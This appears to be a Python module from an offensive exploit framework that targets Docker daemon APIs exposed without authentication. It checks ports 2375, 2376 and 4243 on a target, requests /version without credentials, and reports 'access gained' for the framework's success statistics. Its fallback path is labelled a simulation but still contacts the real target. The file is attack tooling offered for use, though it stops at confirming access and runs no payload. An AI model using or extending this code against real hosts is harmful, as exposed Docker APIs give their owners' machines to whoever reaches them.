"""
Docker API Exploit Module
Exploits exposed Docker API vulnerabilities
"""

import socket
import json
from typing import Dict, Tuple

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class Docker_Exploit(BaseExploit):
    """
    Docker API Unauthorized Access
    Targets: Exposed Docker APIs (port 2375, 2376)
    """
    
    def __init__(self):
        super().__init__(
            name="Docker_API_Exploit",
            target_ports=[2375, 2376, 4243],
            target_os=["Linux", "Windows"]
        )
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if Docker API is exposed"""
        ip = target['ip']
        
        ports = [2375, 2376, 4243]
        for port in ports:
            if port in target.get('open_ports', []):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    
                    if result == 0:
                        logger.debug(f"Docker API port {port} accessible on {ip}")
                        return True
                except Exception as e:
                    logger.debug(f"Docker API check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt Docker API exploitation"""
        ip = target['ip']
        
        # Find which port is open
        port = 2375
        for p in [2375, 2376, 4243]:
            if p in target.get('open_ports', []):
                port = p
                break
        
        logger.info(f"Attempting Docker API exploit on {ip}:{port}")
        
        try:
            try:
                import requests
                has_requests = True
            except ImportError:
                has_requests = False
                logger.warning("requests not installed, using simulation")
            
            if has_requests:
                success = self._try_docker_api_real(ip, port)
            else:
                success = self._try_docker_api_sim(ip, port)
            
            if success:
                self.stats['success'] += 1
                logger.success(f"Docker API access gained on {ip}:{port}")
                
                return True, {
                    'method': 'Docker_API_Unauthorized',
                    'credentials': 'none (exposed API)',
                    'port': port,
                    'service': 'Docker'
                }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"Docker API exploit error on {ip}: {e}")
            return False, {}
    
    def _try_docker_api_real(self, ip: str, port: int) -> bool:
        """Try real Docker API access"""
        try:
            import requests
            
            # Try to get Docker version
            url = f"http://{ip}:{port}/version"
            response = requests.get(url, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                if 'Version' in data:
                    logger.info(f"Docker version: {data['Version']}")
                    return True
            
            return False
            
        except:
            return False
    
    def _try_docker_api_sim(self, ip: str, port: int) -> bool:
        """Simulate Docker API access"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                # Send HTTP GET request
                request = f"GET /version HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                sock.send(request.encode())
                response = sock.recv(1024)
                sock.close()
                
                # Check for Docker API response
                if b"Docker" in response or b"Version" in response:
                    return True
            
            sock.close()
            return False
            
        except:
            return False
